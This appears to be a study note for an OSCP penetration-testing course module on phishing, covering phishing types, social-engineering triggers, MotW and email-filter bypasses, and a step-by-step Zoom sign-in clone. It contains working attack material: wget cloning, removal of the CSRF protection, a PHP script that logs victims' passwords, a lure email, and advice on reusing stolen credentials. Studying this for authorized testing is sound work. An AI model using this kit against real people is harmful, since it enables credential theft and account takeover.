---
title: "PWK Module 11 - Phishing Basics"
created: "2026-04-05"
source: "PEN-200 PWK Course (OffSec 2025) - Pages 305-342"
type: reference-note
status: active
tags:
  - oscp
  - phishing
  - social-engineering
  - client-side
  - pwk
  - reference
  - module-11
---

# Module 11 — Phishing Basics

> **OSCP Exam Relevance:** Phishing is used in real-world red team engagements and OSCP lab scenarios with Active Directory. The hands-on skill here is cloning a site + harvesting credentials. Understanding MotW bypass and Office macros (Module 12) builds on this. For the exam, the credential harvesting chain is the key takeaway.

**Learning Units Covered:**
- 11.1 Phishing 101 (Types + Psychology)
- 11.2 Payloads and Misdirection
- 11.3 Hands-On Credential Phishing (Zoom clone case study)

---

## 11.1 Phishing 101

### 11.1.1 Types of Phishing

| Type | Channel | Target |
|------|---------|--------|
| **Spear phishing** | Email | Specific named individual |
| **Whaling** | Email | C-suite / executives |
| **Smishing** | SMS | Mobile users |
| **Vishing** | Phone call | Any user (impersonate IT, bank) |
| **Chatting** | Teams/Slack/Discord | Corporate users |

**Email phishing is the most common initial access vector** because:
- Email addresses are public (LinkedIn, company websites)
- Users are conditioned to click links in emails
- No exploit needed — just convincing language

### 11.1.2 Smishing and Vishing

- **Smishing**: Text messages with malicious links or urgent instructions
  - Impersonate bank, courier, government
  - URLs shortened to hide destination

- **Vishing**: Voice calls impersonating IT support, help desk, or vendors
  - Script: "I'm calling from IT — your account has been flagged. I need to verify your password."
  - Creates time pressure; victim can't verify visually

- **Chatting (Teams/Slack/Discord)**:
  - More trusted environment than email
  - Can impersonate colleagues once inside workspace
  - Common in business email compromise (BEC) chains

### 11.1.3 Social Engineering Psychology

Understanding **why people fall for phishing** helps craft better campaigns:

| Principle | Trigger | Example |
|-----------|---------|---------|
| **Trust** | Familiarity / authority | "Hi, this is John from IT" |
| **Urgency** | Time pressure | "Your account will be suspended in 24 hours" |
| **Fear** | Consequences | "Unauthorized login detected from Russia" |
| **Authority** | Position/title | "The CEO needs this action by EOD" |
| **Baiting** | Curiosity / greed | "You've received a $500 gift card" |
| **Social proof** | Others are doing it | "Everyone on your team has completed this" |

> 💡 **The key insight:** Phishing bypasses technical controls by targeting **human psychology** — the weakest link in any security chain.

### 11.1.4 AI, Deepfakes, and Voice Cloning

Modern threats have evolved:
- **AI-generated emails**: LLMs remove spelling errors and language tells — harder to spot phishing
- **Deepfake video calls**: Impersonate executives in video meetings
- **Voice cloning**: 3 seconds of audio is enough to clone a voice; fake phone calls from "the CEO"
- **Hyper-targeted spear phishing**: Scraped LinkedIn/social data fed to AI → personalized lures

> ⚠️ **OSCP context:** For exam scenarios, these aren't exploitable directly — but demonstrate why phishing is taken seriously and why organizations want to test it in red team engagements.

---

## 11.2 Payloads and Misdirection

### 11.2.1 Email Delivery Mechanisms

Common payload delivery via email:

| Method | Mechanism | Detection Risk |
|--------|-----------|---------------|
| Malicious link | Sends victim to cloned or exploit page | Medium |
| Office document with macro | .docm, .xlsm runs VBA on open | High (AV/sandbox) |
| ISO/IMG container | Bypasses MotW (no NTFS ADS on FAT32) | Low-Medium |
| PDF with embedded link | Trusted format, links bypass email scanners | Low |
| HTML attachment | Opens locally, renders phishing form | Medium |

### 11.2.2 Mark of the Web (MotW) and Office Macros

**Problem:** Files downloaded from the internet receive a **Mark of the Web** tag (`Zone.Identifier` NTFS ADS). Office treats MOTW-tagged files as untrusted → macros blocked by default.

**Bypass:** Use container formats that don't support NTFS ADS:
- `.iso`, `.img`, `.7z` — FAT32 filesystem inside; no NTFS ADS; MotW not propagated
- Files extracted from ISO do NOT get MotW → macros execute

```
Phishing email → ISO attachment → victim mounts → .lnk or .docm inside → executes
```

### 11.2.3 Email Filter Bypass

**What email filters check:**
- Sender domain reputation and SPF/DKIM/DMARC records
- Known malicious URLs/domains
- Attachment file types and magic bytes
- Embedded links

**Bypass approaches:**
- Register lookalike domain (e.g., `paypa1.com`, `micros0ft.com`)
- Use legitimate services (Google Docs, Dropbox) to host redirect
- Age the domain 30+ days before use (improves reputation)
- Use DKIM/SPF records to pass email authentication

### 11.2.4 Malicious Links and Credential Harvesting

**Two goals of a phishing link:**
1. **Deliver exploit** — drive-by download, browser exploit, fake update
2. **Harvest credentials** — cloned login page captures username + password

For OSCP, **credential harvesting via cloned website** is the primary technique.

---

## 11.3 Hands-On Credential Phishing

### Overview of the Chain

```
Register domain → Clone target site → Clean up site → Inject credential form
→ Send phishing email → Victim submits credentials → POST captured → plaintext creds
```

### 11.3.1 Setting Up for the Attack

**What you need:**
- Apache2 (web server to host the clone)
- A believable domain (or use lab IP)
- Sendmail or similar for email delivery (in labs)

```bash
# Ensure Apache is running
sudo systemctl start apache2

# Default web root
ls /var/www/html/
```

### 11.3.2 Cloning the Target Website

**Tool:** `wget` — recursive download of an entire website for offline/local hosting

```bash
# Clone Zoom signin page
wget -r -np -k -P /var/www/html/zoom http://[target-zoom-url]/signin
# -r  = recursive download
# -np = don't go to parent directories
# -k  = convert links for local use (relative paths)
# -P  = save to this directory
```

**What wget downloads:**
- The signin HTML page
- All CSS, JavaScript, fonts, images (5908 files in the Zoom example)
- Maintains directory structure

```bash
# After cloning, count files
find /var/www/html/zoom -type f | wc -l
# Output: 5908
```

**Move clone to Apache web root:**
```bash
sudo mv /var/www/html/zoom /var/www/html/
# Now accessible at http://YOUR_IP/zoom/signin.html
```

### 11.3.3 Cleaning Up the Clone

**Problem:** Cloned sites often include **CSRF protection** that will reject form submissions not originating from the real site.

**Zoom clone issue:** The page loads `csrf_js/signin.html` which includes OWASP CSRFGuard JavaScript — it validates tokens that only the real Zoom server knows.

**Fix:** Remove the CSRFGuard reference from the cloned HTML

```bash
# Find the CSRFGuard reference
grep -r "CSRFGuard\|csrf_js" /var/www/html/zoom/

# Edit signin.html to remove the CSRFGuard script tag
nano /var/www/html/zoom/signin.html
# Remove: <script src="csrf_js/signin.html"></script>
# Or the equivalent CSRFGuard loading line
```

**Other cleanup tasks:**
- Remove links back to the real domain (replace with local paths or #)
- Remove JavaScript that redirects to the real site after form submit
- Fix any broken relative paths

### 11.3.4 Injecting Malicious Elements

**Goal:** When victim clicks "Sign In," their credentials POST to **our server** — not Zoom's.

**Step 1: Find the form action**

```bash
grep -i "action\|sendUserBehavior\|form" /var/www/html/zoom/signin.html | head -20
```

The real Zoom form POSTs to an endpoint like `/sendUserBehavior` on Zoom's servers.

**Step 2: Use an LLM (or manual edit) to replace the form**

Replace the form action to POST to a PHP handler on your server:

```html
<!-- Original: -->
<form action="https://zoom.us/sendUserBehavior" method="POST">

<!-- Modified: -->
<form action="/capture.php" method="POST">
```

**Step 3: Create the credential capture script**

```php
<?php
// capture.php — save credentials, redirect to real Zoom
$email = $_POST['email'] ?? '';
$password = $_POST['password'] ?? '';
$timestamp = date('Y-m-d H:i:s');

// Log to file
file_put_contents('/var/www/html/creds.txt',
    "$timestamp | $email | $password\n",
    FILE_APPEND
);

// Redirect victim to real Zoom (they think they mistyped)
header('Location: https://zoom.us/signin');
exit;
?>
```

**Step 4: Read captured credentials**

```bash
cat /var/www/html/creds.txt
# 2026-04-05 21:30:14 | victim@company.com | P@ssword123
```

**Step 5: Send phishing email to victim**

```
Subject: Zoom Meeting Invitation
Body: "Click to join the meeting: http://YOUR_IP/zoom/signin.html"
```

When victim enters credentials → redirected to real Zoom → doesn't suspect anything.

---

## Phishing Attack Summary Table

| Stage | Tool/Technique | Output |
|-------|---------------|--------|
| Reconnaissance | LinkedIn/Hunter.io | Target email addresses |
| Domain setup | Registrar + DKIM/SPF | Believable sender domain |
| Clone site | `wget -r -np -k` | Local copy of login page |
| Cleanup | grep/nano/LLM | Remove CSRF, fix links |
| Inject form | Edit HTML form action | POST to capture.php |
| Capture script | PHP file_put_contents | Plaintext credentials → file |
| Delivery | Email with link | Victim clicks → submits |
| Post-exploitation | Captured creds → SSH/VPN | Access with real credentials |

---

## What to Do with Harvested Credentials

```
Captured credentials
    ├── Try directly on target (VPN, Outlook, SSH)
    ├── Password spray against AD (usernames confirmed valid)
    ├── Try same password on other services (reuse)
    └── Use email access to pivot (BEC, internal phishing)
```

---

## Connections

- [[PWK-Module-12-Client-Side-Attacks]] — Office macros, MotW bypass, Windows Library files
- [[PWK-Module-16-Password-Attacks]] — crack hashes from captured NTLM/Net-NTLMv2
- Credential phishing + password spray against AD is a common real-world initial access chain
- [[OSCP-Certification-Sprint]] — parent project

## External Resources

- [GoPhish](https://getgophish.com/) — open-source phishing framework (automates email + tracking)
- [SET (Social Engineering Toolkit)](https://github.com/trustedsec/social-engineer-toolkit) — `setoolkit` on Kali
- [PhishX / EvilGinx](https://github.com/kgretzky/evilginx2) — MITM phishing proxy, bypasses MFA
- [HackTricks - Phishing](https://book.hacktricks.xyz/generic-methodologies-and-resources/phishing-methodology)
- [IppSec - Phishing](https://www.youtube.com/@ippsec) — search "phishing", "social engineering"

---

*From: PWK Module 11, pages 305-342*
